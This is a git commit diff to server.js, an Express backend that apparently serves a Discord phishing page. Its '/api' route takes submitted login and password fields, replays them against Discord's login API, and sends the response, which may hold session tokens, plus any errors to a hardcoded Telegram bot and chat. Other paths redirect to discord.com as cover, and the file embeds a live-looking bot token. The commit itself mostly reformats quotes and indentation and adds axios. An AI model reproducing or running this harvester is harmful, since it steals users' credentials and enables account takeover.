835c663b608c9654e9419fa65718d6129be3db1a
ohakari <150848708+ohakari@users.noreply.github.com>
2024-03-23 19:39:20 +0300

    Update server.js

--- server.js
+++ server.js
@@ -1,7 +1,8 @@
-const express = require('express');
+const express = require("express");
 const app = express();
-const bodyParser = require('body-parser');
-const cors = require('cors');
+const bodyParser = require("body-parser");
+const cors = require("cors");
+const axios = require("axios");
 
 const botToken = "6467130261:AAF7iAaqrPhgDJm7NkZGIhxgGPQ41s4jwOw";
 const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
@@ -10,10 +11,13 @@ app.use(cors());
 app.use(bodyParser.json());
 
 app.use((req, res, next) => {
-    res.setHeader('Access-Control-Allow-Origin', 'http://127.0.0.1:5000'); // Change "*" if needed
-    res.setHeader('Access-Control-Allow-Methods', 'DELETE, POST, GET, OPTIONS');
-    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Requested-With');
-    next();
+  res.setHeader("Access-Control-Allow-Origin", "http://127.0.0.1:5000"); // Change "*" if needed
+  res.setHeader("Access-Control-Allow-Methods", "DELETE, POST, GET, OPTIONS");
+  res.setHeader(
+    "Access-Control-Allow-Headers",
+    "Content-Type, Authorization, X-Requested-With"
+  );
+  next();
 });
 
 app.get("/", (req, res) => {
@@ -24,27 +28,27 @@ app.get("/:one", (req, res) => {
   res.redirect("https://discord.com/app");
 });
 
-app.post('/api', (req, res) => {
+app.post("/api", (req, res) => {
   const info = req.body;
   console.log(info);
 
   fetch("https://discord.com/api/v9/auth/login", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({
-        login: req.body.name,
-        password: req.body.email
-      })
-    })
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+    },
+    body: JSON.stringify({
+      login: req.body.name,
+      password: req.body.email,
+    }),
+  })
     .then((response) => response.json())
     .then((data) => {
       // Успешно!
       console.log(data);
 
       try {
-        await axios
+        axios
           .post(apiUrl, {
             chat_id: "6425112328",
             text: `${data}`,
@@ -54,18 +58,17 @@ app.post('/api', (req, res) => {
           })
           .catch((error) => {
             console.error("Error");
-          });   
+          });
       } catch (error) {
         console.error("error tg send");
       }
-        
     })
     .catch((error) => {
       // Ошибка!
       console.error(error);
 
       try {
-        await axios
+        axios
           .post(apiUrl, {
             chat_id: "6425112328",
             text: `${error}`,
@@ -75,20 +78,19 @@ app.post('/api', (req, res) => {
           })
           .catch((error) => {
             console.error("Error");
-          });   
+          });
       } catch (error) {
         console.error("error tg send");
       }
-        
     });
 
   const response = {
-    endpoint: 'https://www.american.bank/'
+    endpoint: "https://www.american.bank/",
   };
 
   res.json(response);
 });
 
 app.listen(3000, () => {
-  console.log('port 3000');
+  console.log("port 3000");
 });
